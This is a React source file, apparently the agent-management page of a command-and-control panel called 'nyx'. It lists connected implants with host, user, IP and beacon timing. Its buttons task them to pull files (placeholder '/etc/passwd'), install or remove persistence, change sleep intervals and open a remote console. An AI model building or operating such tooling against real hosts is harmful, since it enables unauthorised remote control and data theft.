import { useEffect, useState } from "react";
import { getAgents, createTask, type Agent } from "../api/client";
import { RefreshCw, Terminal, Download, Shield, ShieldOff } from "lucide-react";

function AgentCard({ agent, onConsole }: { agent: Agent; onConsole: (id: string) => void }) {
  const diffSec = Math.floor((Date.now() - new Date(agent.last_seen + "Z").getTime()) / 1000);
  const alive = diffSec < 30;
  const [action, setAction] = useState<string | null>(null);
  const [downloadPath, setDownloadPath] = useState("");
  const [sleepVal, setSleepVal] = useState(agent.sleep);
  const [feedback, setFeedback] = useState("");

  const sendTask = async (cmd: string) => {
    await createTask(agent.id, cmd);
    setFeedback("Task dispatched");
    setTimeout(() => setFeedback(""), 2000);
    setAction(null);
  };

  const handleDownload = async () => {
    if (!downloadPath) return;
    await sendTask(`download ${downloadPath}`);
  };

  const handleSleep = async () => {
    await sendTask(`sleep ${sleepVal}`);
    await fetch(`http://localhost:8000/api/agents/${agent.id}/sleep?sleep=${sleepVal}&jitter=1`, {
      method: "PATCH",
      headers: { Authorization: `Bearer ${localStorage.getItem("nyx_token")}` },
    });
    setFeedback(`Sleep set to ${sleepVal}s`);
    setTimeout(() => setFeedback(""), 2000);
    setAction(null);
  };

  return (
    <div className="bg-nyx-surface border border-nyx-border rounded-lg p-5">
      <div className="flex items-start justify-between mb-4">
        <div className="flex items-center gap-3">
          <div className={`w-3 h-3 rounded-full mt-0.5 ${alive ? "bg-nyx-green animate-pulse" : "bg-nyx-muted"}`} />
          <div>
            <div className="text-nyx-text font-semibold">{agent.hostname}</div>
            <div className="text-nyx-muted text-xs font-mono mt-0.5">{agent.id.slice(0, 16)}...</div>
          </div>
        </div>
        <span className={`text-xs px-2 py-1 rounded font-medium ${alive ? "bg-green-900/30 text-nyx-green" : "bg-nyx-border text-nyx-muted"}`}>
          {alive ? "ACTIVE" : "OFFLINE"}
        </span>
      </div>

      <div className="grid grid-cols-2 gap-x-6 gap-y-2 mb-4">
        {[
          ["User", agent.username],
          ["Platform", `${agent.os}/${agent.arch}`],
          ["IP", agent.ip],
          ["Last Seen", diffSec < 60 ? `${diffSec}s ago` : `${Math.floor(diffSec / 60)}m ago`],
          ["Sleep", `${agent.sleep}s ± ${agent.jitter}s`],
          ["PID", "—"],
        ].map(([label, value]) => (
          <div key={label}>
            <div className="text-nyx-muted text-xs uppercase tracking-wider">{label}</div>
            <div className="text-nyx-text text-sm font-mono">{value}</div>
          </div>
        ))}
      </div>

      {feedback && (
        <div className="mb-3 text-nyx-green text-xs bg-green-900/20 border border-green-900/40 rounded px-3 py-1.5">
          {feedback}
        </div>
      )}

      {action === "download" && (
        <div className="mb-3 flex gap-2">
          <input
            value={downloadPath}
            onChange={(e) => setDownloadPath(e.target.value)}
            placeholder="/etc/passwd"
            className="flex-1 bg-nyx-bg border border-nyx-border rounded px-3 py-1.5 text-nyx-text text-sm focus:outline-none focus:border-nyx-accent"
          />
          <button onClick={handleDownload} className="bg-nyx-accent text-white px-3 py-1.5 rounded text-sm">Get</button>
          <button onClick={() => setAction(null)} className="text-nyx-muted hover:text-nyx-text px-2 text-sm">✕</button>
        </div>
      )}

      {action === "sleep" && (
        <div className="mb-3 flex gap-2 items-center">
          <input
            type="number"
            value={sleepVal}
            onChange={(e) => setSleepVal(e.target.value)}
            className="w-24 bg-nyx-bg border border-nyx-border rounded px-3 py-1.5 text-nyx-text text-sm focus:outline-none focus:border-nyx-accent"
          />
          <span className="text-nyx-muted text-sm">seconds</span>
          <button onClick={handleSleep} className="bg-nyx-accent text-white px-3 py-1.5 rounded text-sm">Set</button>
          <button onClick={() => setAction(null)} className="text-nyx-muted hover:text-nyx-text px-2 text-sm">✕</button>
        </div>
      )}

      <div className="flex gap-2 flex-wrap">
        <button
          onClick={() => onConsole(agent.id)}
          className="flex items-center gap-1.5 text-xs bg-nyx-border hover:bg-nyx-accent hover:text-white text-nyx-text px-3 py-1.5 rounded transition-colors"
        >
          <Terminal size={12} /> Console
        </button>
        <button
          onClick={() => setAction(action === "download" ? null : "download")}
          className="flex items-center gap-1.5 text-xs bg-nyx-border hover:bg-nyx-accent hover:text-white text-nyx-text px-3 py-1.5 rounded transition-colors"
        >
          <Download size={12} /> Download File
        </button>
        <button
          onClick={() => sendTask("persist")}
          className="flex items-center gap-1.5 text-xs bg-nyx-border hover:bg-green-800 hover:text-white text-nyx-text px-3 py-1.5 rounded transition-colors"
        >
          <Shield size={12} /> Persist
        </button>
        <button
          onClick={() => sendTask("unpersist")}
          className="flex items-center gap-1.5 text-xs bg-nyx-border hover:bg-red-900 hover:text-white text-nyx-text px-3 py-1.5 rounded transition-colors"
        >
          <ShieldOff size={12} /> Unpersist
        </button>
        <button
          onClick={() => setAction(action === "sleep" ? null : "sleep")}
          className="flex items-center gap-1.5 text-xs bg-nyx-border hover:bg-nyx-accent hover:text-white text-nyx-text px-3 py-1.5 rounded transition-colors"
        >
          ⏱ Sleep
        </button>
      </div>
    </div>
  );
}

interface AgentsProps {
  onNavigateConsole?: (agentId: string) => void;
}

export default function Agents({ onNavigateConsole }: AgentsProps) {
  const [agents, setAgents] = useState<Agent[]>([]);
  const [loading, setLoading] = useState(false);

  const load = () => {
    setLoading(true);
    getAgents().then(setAgents).finally(() => setLoading(false));
  };

  useEffect(() => {
    load();
    const i = setInterval(load, 5000);
    return () => clearInterval(i);
  }, []);

  return (
    <div className="p-6 space-y-4">
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-nyx-text text-xl font-semibold">Agents</h1>
          <p className="text-nyx-muted text-sm mt-1">{agents.length} registered</p>
        </div>
        <button
          onClick={load}
          className="flex items-center gap-2 text-nyx-muted hover:text-nyx-text text-sm border border-nyx-border px-3 py-2 rounded transition-colors"
        >
          <RefreshCw size={14} className={loading ? "animate-spin" : ""} />
          Refresh
        </button>
      </div>

      <div className="grid gap-4 md:grid-cols-2">
        {agents.length === 0 && (
          <div className="col-span-2 bg-nyx-surface border border-nyx-border rounded-lg p-10 text-center text-nyx-muted text-sm">
            No agents connected. Deploy an agent to begin.
          </div>
        )}
        {agents.map((a) => (
          <AgentCard
            key={a.id}
            agent={a}
            onConsole={(id) => onNavigateConsole?.(id)}
          />
        ))}
      </div>
    </div>
  );
}
